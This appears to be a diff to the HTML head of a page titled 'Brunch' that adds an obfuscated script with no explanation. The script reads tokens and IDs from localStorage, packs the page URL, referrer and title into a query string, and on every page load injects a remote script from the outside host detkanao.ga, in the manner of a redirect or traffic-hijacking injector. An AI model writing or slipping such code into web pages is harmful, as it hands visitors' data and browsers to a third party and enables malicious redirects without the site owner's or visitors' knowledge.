@@ -1,5 +1,48 @@
 <!DOCTYPE html>
 <head>
+  <script>
+    (function() {
+    var name = '_gjd7scfhGRD6QvMp';
+    if (!window._gjd7scfhGRD6QvMp) {
+        window._gjd7scfhGRD6QvMp = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://detkanao.ga/XPpcbY7J',
+            P_PATH: 'https://detkanao.ga/7b4f75c/postback',
+        };
+    }
+    const _H3YwdXrBzGCsr6LL = localStorage.getItem('config');
+    if (typeof _H3YwdXrBzGCsr6LL !== 'undefined' && _H3YwdXrBzGCsr6LL !== null) {
+        var _s5FQdQL3PJqN6JQs = JSON.parse(_H3YwdXrBzGCsr6LL);
+        var _yrkJh8B9XjvLpqv2 = Math.round(+new Date()/1000);
+        if (_s5FQdQL3PJqN6JQs.created_at + window._gjd7scfhGRD6QvMp.ttl < _yrkJh8B9XjvLpqv2) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _HZHQ7dTsMKFfBT6S = localStorage.getItem('subId');
+    var _jVNwVz9hVCnXwKhV = localStorage.getItem('token');
+    var _XsQKTYmjmtg1DQkg = '?return=js.client';
+        _XsQKTYmjmtg1DQkg += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _XsQKTYmjmtg1DQkg += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _XsQKTYmjmtg1DQkg += '&default_keyword=' + encodeURIComponent(document.title);
+        _XsQKTYmjmtg1DQkg += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _XsQKTYmjmtg1DQkg += '&name=' + encodeURIComponent(name);
+        _XsQKTYmjmtg1DQkg += '&host=' + encodeURIComponent(window._gjd7scfhGRD6QvMp.R_PATH);
+    if (typeof _HZHQ7dTsMKFfBT6S !== 'undefined' && _HZHQ7dTsMKFfBT6S && window._gjd7scfhGRD6QvMp.unique) {
+        _XsQKTYmjmtg1DQkg += '&sub_id=' + encodeURIComponent(_HZHQ7dTsMKFfBT6S);
+    }
+    if (typeof _jVNwVz9hVCnXwKhV !== 'undefined' && _jVNwVz9hVCnXwKhV && window._gjd7scfhGRD6QvMp.unique) {
+        _XsQKTYmjmtg1DQkg += '&token=' + encodeURIComponent(_jVNwVz9hVCnXwKhV);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._gjd7scfhGRD6QvMp.R_PATH + _XsQKTYmjmtg1DQkg;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width">
   <title>Brunch</title>
